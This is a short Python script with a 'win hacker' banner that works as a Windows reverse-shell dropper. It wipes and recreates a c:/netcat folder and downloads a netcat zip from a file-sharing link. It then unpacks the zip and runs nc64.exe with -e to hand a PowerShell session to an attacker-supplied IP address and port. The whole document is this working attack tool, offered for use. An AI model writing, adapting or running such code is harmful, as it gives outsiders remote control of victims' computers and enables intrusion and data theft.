import requests
import os
import shutil
import time
import subprocess

# this code always download netcat folder ! if the netcat folder exists it will autodelete and autodownload the netcat folder
# use netcat to get the reverse connection (or any else software)

os.system('cls')

blue = '\x1b[34m'
green = '\x1b[32m'
red = '\x1b[41m'
stop = '\x1b[0m'

print(f""" {blue}             $$\                 $$\                           $$\                           
              \__|                $$ |                          $$ |                          
$$\  $$\  $$\ $$\ $$$$$$$\        $$$$$$$\   $$$$$$\   $$$$$$$\ $$ |  $$\  $$$$$$\   $$$$$$\  
$$ | $$ | $$ |$$ |$$  __$$\       $$  __$$\  \____$$\ $$  _____|$$ | $$  |$$  __$$\ $$  __$$\ 
$$ | $$ | $$ |$$ |$$ |  $$ |      $$ |  $$ | $$$$$$$ |$$ /      $$$$$$  / $$$$$$$$ |$$ |  \__|
$$ | $$ | $$ |$$ |$$ |  $$ |      $$ |  $$ |$$  __$$ |$$ |      $$  _$$<  $$   ____|$$ |      
\$$$$$\$$$$  |$$ |$$ |  $$ |      $$ |  $$ |\$$$$$$$ |\$$$$$$$\ $$ | \$$\ \$$$$$$$\ $$ |      
 \_____\____/ \__|\__|  \__|      \__|  \__| \_______| \_______|\__|  \__| \_______|\__|      
                                                                                              
                                                                                               {stop}""")

try:
    os.mkdir('c:/netcat')
    print(f'{green}netcat folder created{stop}')
except Exception:
    shutil.rmtree('c:/netcat')
    os.mkdir('c:/netcat')
    print(f'{green}netcat folder created{stop}')

def download(downloadUrl):
    req = requests.get(downloadUrl)
    print(f'{green}downloading of netcat.zip{stop}')

    with open(f'c:/netcat/netcat.zip', 'wb') as f:
        for chunk in req.iter_content(chunk_size=8192):
            f.write(chunk)

            print(f'{blue}download of netcat.zip completed{stop}')

download('https://www.4sync.com/web/directDownload/aNHtMRp8/CggsuJhW.bdb188ac3bdd769e50388897cadb0c05')

os.chdir('c:/netcat')
os.mkdir('c:/netcat/nc')
cwd =os.getcwd()
print(cwd)
print('\n')

subprocess.run('tar -xf netcat.zip -C c:/netcat/nc', shell=True)
print(f'{blue}files extracted{stop}')

os.chdir('c:/netcat/nc/netcat')
os.getcwd()

ipAddr = ''                         # --> provide IP ADDRESS here 
port = ''                           # --> provide PORT NO here

print(f'{green}connected to {ipAddr} @ port {port}{stop}')
print('\n')
subprocess.run(f"nc64.exe -e c:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe {ipAddr} {port}", shell=True)
print(f'{red}disconnected from {ipAddr}{stop}')
print('\n')
time.sleep(20)
